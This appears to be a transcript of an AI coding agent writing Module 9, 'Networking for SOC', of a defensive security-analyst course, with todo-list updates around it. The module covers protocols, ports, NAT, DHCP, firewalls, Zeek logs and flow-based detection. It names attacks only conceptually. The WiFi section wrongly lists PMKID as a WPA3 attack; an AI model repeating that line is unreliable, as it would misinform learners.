    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 227.2s)

_Thinking:_

Now I'll create Module 9 - Networking for SOC.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 9: Networking for SOC\n\n**Priority: P0 — Network visibility = detection coverage. L1 must read PCAP, flows, logs.**\n\n---\n\n## 9.1 OSI Model — SOC Perspective\n\n| Layer | Name | PDU | SOC Relevance | Key Protocols |\n|-------|------|-----|---------------|---------------|\n| **7** | Application | Data | **App-layer visibility** (HTTP, DNS, SMTP, LDAP, Kerberos) | HTTP, DNS, SMTP, IMAP, LDAP, Kerberos, RDP, SSH |\n| **6** | Presentation | Data | Encryption, encoding, compression | TLS/SSL, ASN.1, MIME |\n| **5** | Session | Data | Session management, RPC | NetBIOS, RPC, PPTP |\n| **4** | Transport | Segment | **Ports, connections, state** | TCP, UDP, SCTP |\n| **3** | Network | Packet | **Routing, IP addressing, fragmentation** | IP, ICMP, IPsec, OSPF, BGP |\n| **2** | Data Link | Frame | **MAC, VLAN, switching, ARP** | Ethernet, WiFi, ARP, VLAN, PPP |\n| **1** | Physical | Bits | Hardware, cabling, signals | Copper, Fiber, Radio |\n\n**L1 Focus**: Layers 3, 4, 7 (IP, TCP/UDP, Application). Layer 2 for local network forensics.\n\n---\n\n## 9.2 TCP/IP Suite — Core Protocols\n\n### IP (Internet Protocol) — Layer 3\n| Field | Size | SOC Relevance |\n|-------|------|---------------|\n| Version | 4 bits | IPv4 (4) vs IPv6 (6) |\n| IHL | 4 bits | Header length (options?) |\n| DSCP/ECN | 8 bits | QoS, congestion marking |\n| Total Length | 16 bits | Packet size (MTU issues) |\n| Identification | 16 bits | Fragmentation tracking |\n| Flags/Fragment Offset | 16 bits | **Fragmentation attacks** |\n| **TTL** | 8 bits | **Hop count, traceroute, OS fingerprint** |\n| **Protocol** | 8 bits | **TCP=6, UDP=17, ICMP=1, IPsec=50/51** |\n| Header Checksum | 16 bits | Integrity |\n| **Source IP** | 32/128 bits | **Attribution, geo, reputation** |\n| **Destination IP** | 32/128 bits | **Target, pivot detection** |\n| Options | Variable | Rare, suspicious (source routing) |\n\n### ICMP (Internet Control Message Protocol) — Layer 3.5\n| Type | Code | Name | SOC Relevance |\n|------|------|------|---------------|\n| 0 | 0 | Echo Reply | Ping response |\n| 3 | 0-15 | Destination Unreachable | **Firewall blocks, network mapping** |\n| 3 | 3 | Port Unreachable | UDP scan response |\n| 4 | 0 | Source Quench | Legacy congestion |\n| 5 | 0-3 | Redirect | **MITM potential** |\n| 8 | 0 | Echo Request | Ping, **traceroute, covert channel** |\n| 11 | 0-1 | Time Exceeded | **Traceroute (TTL expired)** |\n| 13/14 | 0 | Timestamp | Clock sync, reconnaissance |\n| 30 | 0 | Traceroute (deprecated) | Alternative traceroute |\n\n**Covert Channel**: ICMP tunneling (data in payload), oversized packets (>64 bytes).\n\n### TCP (Transmission Control Protocol) — Layer 4\n```\nTCP Header (20 bytes minimum):\n┌─────────────────────────────────────────────────────────────┐\n│ Source Port (16)  │ Destination Port (16)                   │\n├─────────────────────────────────────────────────────────────┤\n│ Sequence Number (32)                                        │\n├─────────────────────────────────────────────────────────────┤\n│ Acknowledgment Number (32)                                  │\n├──────────┬──────┬──────┬────────────────────────────────────┤\n│ Data Off │ RSV  │ Flags │ Window Size (16)                  │\n├──────────┼──────┼──────┼────────────────────────────────────┤\n│ Checksum (16)   │ Urgent Pointer (16)                       │\n├─────────────────────────────────────────────────────────────┤\n│ Options (Variable: MSS, Window Scale, SACK, Timestamp)      │\n└─────────────────────────────────────────────────────────────┘\n```\n\n**TCP Flags (Memorize)**:\n| Flag | Bit | Hex | Meaning | SOC Relevance |\n|------|-----|-----|---------|---------------|\n| **SYN** | 1 | 0x02 | Synchronize (start) | **Port scan (SYN scan), connection attempts** |\n| **SYN-ACK** | 1+4 | 0x12 | SYN + ACK | Server response, **open port** |\n| **ACK** | 4 | 0x10 | Acknowledge | Data transfer, keep-alive |\n| **FIN** | 0 | 0x01 | Finish (graceful close) | Normal termination |\n| **RST** | 2 | 0x04 | Reset (abort) | **Port closed, firewall block, scanner** |\n| **PSH** | 3 | 0x08 | Push (urgent data) | Application urgency |\n| **URG** | 5 | 0x20 | Urgent pointer valid | Rare, potential exploit |\n\n### Three-Way Handshake (Memorize)\n```\nClient                                    Server\n   │                                          │\n   ├─ SYN (seq=X) ───────────────────────────►│\n   │                                          │\n   │◄─ SYN-ACK (seq=Y, ack=X+1) ─────────────┤\n   │                                          │\n   ├─ ACK (seq=X+1, ack=Y+1) ────────────────►│\n   │                                          │\n   │         CONNECTION ESTABLISHED           │\n   │                                          │\n```\n\n**Half-Open (SYN Flood)**: Client sends SYN, never completes ACK → Server resource exhaustion.\n\n### TCP Connection Termination\n```\nGraceful (4-way):\nClient                                    Server\n   ├─ FIN ─────────────────────────────────►│\n   │◄─ ACK ─────────────────────────────────┤\n   │                                          │ (Server closes)\n   │◄─ FIN ─────────────────────────────────┤\n   ├─ ACK ─────────────────────────────────►│\n\nAbrupt (RST):\n   ├─ RST ─────────────────────────────────►│  (Immediate close)\n```\n\n### UDP (User Datagram Protocol) — Layer 4\n| Field | Size | Notes |\n|-------|------|-------|\n| Source Port | 16 bits | |\n| Destination Port | 16 bits | |\n| Length | 16 bits | Header + Data |\n| Checksum | 16 bits | Optional in IPv4 |\n\n**SOC Relevance**: DNS (53), NTP (123), SNMP (161/162), Syslog (514), DHCP (67/68), **Amplification attacks** (NTP, DNS, Memcached), **CoAP/IoT**, **QUIC (HTTP/3)**.\n\n---\n\n## 9.3 Critical Ports — Memorize These\n\n| Port | Protocol | Service | SOC Relevance |\n|------|----------|---------|---------------|\n| **20/21** | TCP | FTP (Data/Control) | Credential theft, anonymous access, data exfil |\n| **22** | TCP | SSH | **Brute force, lateral (Linux), tunneling, proxy** |\n| **23** | TCP | Telnet | **Cleartext creds, IoT, legacy** |\n| **25** | TCP | SMTP | **Phishing relay, spam, enumeration (VRFY/EXPN)** |\n| **53** | TCP/UDP | DNS | **C2, tunneling, exfil, reconnaissance** |\n| **67/68** | UDP | DHCP | Rogue DHCP, MITM |\n| **69** | UDP | TFTP | Firmware, config exfil, IoT |\n| **80** | TCP | HTTP | **Web attacks, C2, phishing delivery** |\n| **88** | TCP/UDP | Kerberos | **Authentication, Kerberoasting, delegation** |\n| **110** | TCP | POP3 | Credential theft, cleartext |\n| **123** | UDP | NTP | **Amplification, time sync (kerberos depends on it)** |\n| **135** | TCP | RPC Endpoint Mapper | **Lateral movement, reconnaissance** |\n| **137/138/139** | TCP/UDP | NetBIOS | Legacy, enumeration, poisoning |\n| **143** | TCP | IMAP | Credential theft |\n| **161/162** | UDP | SNMP | **Enumeration (public community), config theft** |\n| **389** | TCP/UDP | LDAP | **AD enumeration, authentication, delegation** |\n| **443** | TCP | HTTPS | **C2, exfil, phishing, web attacks (encrypted)** |\n| **445** | TCP | SMB | **Lateral movement, PsExec, file share, ransomware** |\n| **464** | TCP/UDP | Kerberos Password Change | Password reset attacks |\n| **514** | UDP | Syslog | Log injection, exfil |\n| **587** | TCP | SMTP Submission | Authenticated relay |\n| **593** | TCP | HTTP RPC (Outlook Anywhere) | Legacy Exchange |\n| **636** | TCP | LDAPS | Secure LDAP |\n| **993** | TCP | IMAPS | Secure IMAP |\n| **995** | TCP | POP3S | Secure POP3 |\n| **1433** | TCP | MSSQL | **Data theft, xp_cmdshell, lateral** |\n| **1434** | UDP | MSSQL Browser | Enumeration |\n| **1723** | TCP | PPTP VPN | Legacy VPN |\n| **3306** | TCP | MySQL | Data theft |\n| **3389** | TCP | RDP | **Brute force, lateral, credential theft, BlueKeep** |\n| **5060/5061** | UDP/TCP | SIP | VoIP enumeration |\n| **5432** | TCP | PostgreSQL | Data theft |\n| **5900** | TCP | VNC | Remote access, often no auth |\n| **5985/5986** | TCP | WinRM (HTTP/HTTPS) | **Lateral (PowerShell Remoting)** |\n| **8080/8443/8888** | TCP | HTTP Alt / Proxies | **C2, web shells, dev servers** |\n| **9100** | TCP | JetDirect (Printers) | IoT, printer exploitation |\n| **27017** | TCP | MongoDB | Data theft, ransomware |\n\n---\n\n## 9.4 IP Addressing & Routing — SOC Essentials\n\n### IPv4 Address Classes (Legacy but still referenced)\n| Class | Range | CIDR | Hosts | Use |\n|-------|-------|------|-------|-----|\n| A | 1.0.0.0 – 126.255.255.255 | /8 | 16.7M | Large orgs |\n| B | 128.0.0.0 – 191.255.255.255 | /16 | 65K | Medium orgs |\n| C | 192.0.0.0 – 223.255.255.255 | /24 | 254 | Small orgs |\n| D | 224.0.0.0 – 239.255.255.255 | N/A | N/A | Multicast |\n| E | 240.0.0.0 – 255.255.255.255 | N/A | N/A | Reserved |\n\n### Private RFC 1918 Ranges (Internal Only)\n| Range | CIDR | Hosts |\n|-------|------|-------|\n| 10.0.0.0 – 10.255.255.255 | 10.0.0.0/8 | 16.7M |\n| 172.16.0.0 – 172.31.255.255 | 172.16.0.0/12 | 1M |\n| 192.168.0.0 – 192.168.255.255 | 192.168.0.0/16 | 65K |\n\n**Carrier-Grade NAT (CGNAT)**: 100.64.0.0/10 (ISP internal)\n\n### Special Addresses\n| Address | Purpose |\n|---------|---------|\n| 0.0.0.0 | Default route, \"this network\" |\n| 127.0.0.0/8 | Loopback (127.0.0.1 = localhost) |\n| 169.254.0.0/16 | Link-local (APIPA — DHCP fail) |\n| 224.0.0.0/4 | Multicast (mDNS, routing protocols) |\n| 255.255.255.255 | Limited broadcast |\n\n### Subnetting (CIDR) — Quick Reference\n| CIDR | Mask | Hosts | Use |\n|------|------|-------|-----|\n| /32 | 255.255.255.255 | 1 | Single host |\n| /30 | 255.255.255.252 | 2 | Point-to-point |\n| /29 | 255.255.255.248 | 6 | Small segment |\n| /28 | 255.255.255.240 | 14 | DMZ, mgmt |\n| /27 | 255.255.255.224 | 30 | VLAN |\n| /26 | 255.255.255.192 | 62 | Department |\n| /24 | 255.255.255.0 | 254 | Standard VLAN |\n| /23 | 255.255.254.0 | 510 | Large VLAN |\n| /22 | 255.255.252.0 | 1022 | Building |\n| /16 | 255.255.0.0 | 65K | Campus |\n\n### NAT (Network Address Translation)\n| Type | Description | SOC Impact |\n|------|-------------|------------|\n| **Static NAT** | 1:1 mapping (Public ↔ Private) | Server exposure tracking |\n| **Dynamic NAT** | Pool of public IPs | Session correlation harder |\n| **PAT / NAPT** | Many:1 (Port Address Translation) | **Most common — source port = session ID** |\n| **Double NAT** | NAT behind NAT (home + ISP) | Geo/IP reputation confusion |\n\n**Firewall Logs**: Show **post-NAT** (public IP) or **pre-NAT** (private IP) depending on placement. Know your sensor location!\n\n---\n\n## 9.5 DHCP — Dynamic Host Configuration Protocol\n\n### DORA Process\n```\nClient                                    Server\n   │                                          │\n   ├─ DISCOVER (broadcast) ──────────────────►│\n   │                                          │\n   │◄─ OFFER (unicast/broadcast) ────────────┤\n   │   • Offered IP, Subnet, Gateway, DNS     │\n   │   • Lease Time, Server ID, Options       │\n   │                                          │\n   ├─ REQUEST (broadcast) ───────────────────►│\n   │   • Requested IP, Server ID              │\n   │                                          │\n   │◄─ ACK (unicast) ────────────────────────┤\n   │   • Confirmed IP, Lease, Options         │\n```\n\n### DHCP Options (Security Relevant)\n| Option | Name | Abuse |\n|--------|------|-------|\n| 1 | Subnet Mask | |\n| 3 | Router (Gateway) | **Rogue gateway → MITM** |\n| 6 | DNS Servers | **Rogue DNS → Phishing, C2 redirect** |\n| 15 | Domain Name | |\n| 42 | NTP Servers | Time sync attacks |\n| 60 | Vendor Class ID | Device fingerprinting |\n| 66/67 | TFTP Server / Bootfile | **PXE boot hijack** |\n| 119 | Domain Search | Suffix search order |\n| 252 | WPAD (Proxy Auto-Config) | **WPAD spoofing → MITM** |\n\n### DHCP Attack Detection\n- **Rogue DHCP**: Multiple OFFERs for same client, unauthorized server MAC\n- **DHCP Starvation**: Exhaust pool (many DISCOVERs from different MACs)\n- **Option 6/252 tampering**: Rogue DNS/WPAD in OFFER/ACK\n\n---\n\n## 9.6 VPN, Proxy, Firewall — Network Security Devices\n\n### VPN (Virtual Private Network)\n| Type | Protocol | Port | SOC Visibility |\n|------|----------|------|----------------|\n| **IPsec** | ESP (50), AH (51), IKE (500/4500) | Encrypted | **Limited** (metadata only) |\n| **SSL/TLS VPN** | HTTPS (443) | 443 | App-layer visibility (if decrypt) |\n| **WireGuard** | UDP (51820 default) | High perf | Modern, simple |\n| **OpenVPN** | UDP/TCP (1194) | Configurable | TLS-based |\n\n**VPN Logs**: User, source IP, assigned virtual IP, connect/disconnect time, bytes transferred, split-tunnel vs full-tunnel.\n\n### Proxy (Forward Proxy)\n| Mode | Description | Visibility |\n|------|-------------|------------|\n| **Explicit** | Client configured (PAC/WPAD) | Full HTTP/HTTPS (with decrypt) |\n| **Transparent** | Intercepted (no client config) | Full (with decrypt) |\n| **Reverse** | Protects servers (WAF) | Inbound visibility |\n\n**Proxy Logs**: Timestamp, Client IP, User, Method, URL, Category, Response Code, Bytes, MIME Type, **User-Agent**, **Referer**, **X-Forwarded-For**, Action (Allow/Block/Scan).\n\n### Firewall (Stateful Inspection)\n| Feature | Description |\n|---------|-------------|\n| **State Table** | Tracks TCP state (SYN, ESTABLISHED, FIN), UDP pseudo-state |\n| **Rules** | Source/Dest IP, Port, Protocol, App-ID, User-ID, Action |\n| **Zones** | Trust, Untrust, DMZ, Management |\n| **NAT** | Source/Dest NAT, PAT |\n| **App-ID** | Layer 7 identification (SSL, SSH, Facebook, etc.) |\n| **User-ID** | Maps IP → User (AD integration) |\n| **Decryption** | SSL Forward Proxy (outbound), SSL Inbound Inspection |\n\n**Firewall Logs**: Timestamp, Rule Name, Source IP/Port/Zone/User, Dest IP/Port/Zone, Protocol, App, Action, Bytes, Packets, **Session ID**, Threat ID (if IPS/AV hit).\n\n### IDS/IPS (Intrusion Detection/Prevention)\n| Mode | Placement | Action |\n|------|-----------|--------|\n| **IDS** | SPAN/TAP (passive) | Alert only |\n| **IPS** | Inline (active) | Block/Drop/Reset |\n\n**Signatures**: Snort/Suricata rules, Emerging Threats, Vendor proprietary.\n**Anomaly**: Baseline deviation (beaconing, volume, new protocols).\n\n---\n\n## 9.7 NDR (Network Detection and Response)\n\n### Data Sources\n| Source | Collection | Visibility |\n|--------|------------|------------|\n| **SPAN/Mirror Port** | Switch port mirroring | East-West, North-South |\n| **Network TAP** | Hardware tap (passive) | Full line rate, no drop |\n| **Cloud/VPC Flow Logs** | AWS VPC Flow Logs, Azure NSG Flow Logs, GCP VPC Flow Logs | Cloud east-west |\n| **Zeek (Bro)** | Software sensor | **Protocol parsing, files, certs, scripts** |\n| **Suricata** | IDS/IPS engine | Rules + protocol parsing |\n\n### Zeek (Bro) — Key Logs\n| Log File | Content |\n|----------|---------|\n| `conn.log` | **All connections** (5-tuple, duration, bytes, state, service) |\n| `http.log` | HTTP requests/responses (method, URI, headers, status, body hash) |\n| `dns.log` | DNS queries/responses (query, answers, TTL, query type) |\n| `ssl.log` | TLS handshakes (version, cipher, cert, JA3, SNI, validation) |\n| `files.log` | Extracted files (hash, MIME, source) |\n| `x509.log` | Certificate details |\n| `ssh.log` | SSH sessions (version, auth, algorithms) |\n| `rdp.log` | RDP connections |\n| `smb_files.log` / `smb_mapping.log` | SMB file access, share mapping |\n| `kerberos.log` | Kerberos traffic |\n| `weird.log` | Protocol anomalies |\n\n---\n\n## 9.8 Network Flow Data (NetFlow/IPFIX/sFlow)\n\n### NetFlow v5/v9/IPFIX Fields\n| Field | Description |\n|-------|-------------|\n| **Src IP, Dst IP** | Endpoints |\n| **Src Port, Dst Port** | Services |\n| **Protocol** | TCP=6, UDP=17, ICMP=1 |\n| **Packets, Bytes** | Volume |\n| **Start Time, End Time** | Duration |\n| **TCP Flags (OR'd)** | SYN, FIN, RST, PSH, ACK, URG |\n| **ToS/DSCP** | QoS marking |\n| **Input/Output Interface** | Direction |\n| **AS Numbers** | Source/Dest Autonomous System |\n| **Next Hop** | Routing |\n| **VLAN IDs** | Segmentation |\n\n### Flow Analysis for SOC\n| Pattern | Detection |\n|---------|-----------|\n| **Beaconing** | Regular interval, small packets, long duration |\n| **Port Scan** | One src → many dst ports (SYN only) |\n| **Host Scan** | One src → many dst IPs (same port) |\n| **Data Exfil** | Large outbound, unusual dest, off-hours |\n| **Lateral Movement** | Internal → Internal (SMB, RDP, RPC, WinRM) |\n| **C2** | Known bad IP, DGA domains, suspicious JA3 |\n| **DDoS** | Volume spike, many sources → one dest |\n\n---\n\n## 9.9 Wireless (WiFi) — Brief SOC Notes\n\n| Standard | Freq | Max Rate | Security |\n|----------|------|----------|----------|\n| 802.11n (WiFi 4) | 2.4/5 GHz | 600 Mbps | WPA2 |\n| 802.11ac (WiFi 5) | 5 GHz | 6.9 Gbps | WPA2/WPA3 |\n| 802.11ax (WiFi 6/6E) | 2.4/5/6 GHz | 9.6 Gbps | WPA3 |\n\n**Attacks**: Evil Twin (rogue AP), KRACK (WPA2), PMKID (WPA3), Deauth, WPS PIN brute force.\n**Detection**: WIPS (Wireless IPS), rogue AP detection, anomalous associations.\n\n---\n\n## 9.10 Interview Questions for This Module\n\n1. **Explain the TCP three-way handshake and what each packet contains.**\n   - SYN (seq=X) → SYN-ACK (seq=Y, ack=X+1) → ACK (seq=X+1, ack=Y+1). Establishes sequence numbers for reliable delivery.\n\n2. **What is the difference between TCP and UDP? When would you see each?**\n   - TCP: Connection-oriented, reliable, ordered, flow control (HTTP, SSH, SMB). UDP: Connectionless, no guarantee, low latency (DNS, NTP, DHCP, streaming).\n\n3. **What do the TCP flags SYN, ACK, FIN, RST, PSH mean?**\n   - SYN: Start connection. ACK: Acknowledge. FIN: Graceful close. RST: Abort connection. PSH: Push data to app immediately.\n\n4. **What is NAT and how does it affect SOC visibility?**\n   - Network Address Translation maps private IPs to public. PAT (NAPT) uses ports for many:1 mapping. Sensors see post-NAT or pre-NAT depending on placement — must know which!\n\n5. **What are the RFC 1918 private IP ranges?**\n   - 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. Also CGNAT 100.64.0.0/10.\n\n6. **What is the DHCP DORA process and which options are security-relevant?**\n   - Discover, Offer, Request, ACK. Options: 3 (Gateway — MITM), 6 (DNS — hijack), 252 (WPAD — MITM), 66/67 (PXE boot).\n\n7. **What is the difference between a forward proxy and a reverse proxy?**\n   - Forward: Client → Internet (egress control, visibility). Reverse: Internet → Server (WAF, load balancing, inbound protection).\n\n8. **What network data sources does NDR use and what does Zeek provide?**\n   - SPAN/TAP, Cloud flow logs, Zeek, Suricata. Zeek: conn.log, http.log, dns.log, ssl.log, files.log, x509.log — protocol parsing + extracted artifacts.\n\n9. **What NetFlow fields are most useful for detecting C2 beaconing?**\n   - Src/Dst IP/Port, Protocol, Packets/Bytes, Start/End Time, TCP Flags, Duration. Beaconing = regular interval, small bytes, long duration, same dest.\n\n10. **How does a TCP SYN scan work and what does the target respond with?**\n    - Scanner sends SYN → Open port responds SYN-ACK → Scanner sends RST (never completes handshake). Closed port responds RST. Filtered = no response.\n\n---\n\n## 9.11 Study Checklist for Module 9\n\n- [ ] Draw OSI/TCP/IP model with protocols at each layer\n- [ ] Explain TCP 3-way handshake and 4-way termination\n- [ ] Identify TCP flags and their hex values\n- [ ] List top 30 ports with service and SOC relevance\n- [ ] Explain IPv4 classes, RFC 1918, CIDR notation\n- [ ] Describe NAT types and SOC impact\n- [ ] Walk through DHCP DORA and identify risky options\n- [ ] Compare VPN, Proxy, Firewall, IDS/IPS visibility\n- [ ] List Zeek log files and their content\n- [ ] Identify flow analysis patterns (beaconing, scan, exfil, lateral)\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 10 — DNS Security*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/09-networking-for-soc.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 38.1s)

_Thinking:_

Module 9 is complete. Now I'll continue with Module 10 - DNS Security.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "in_progress"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
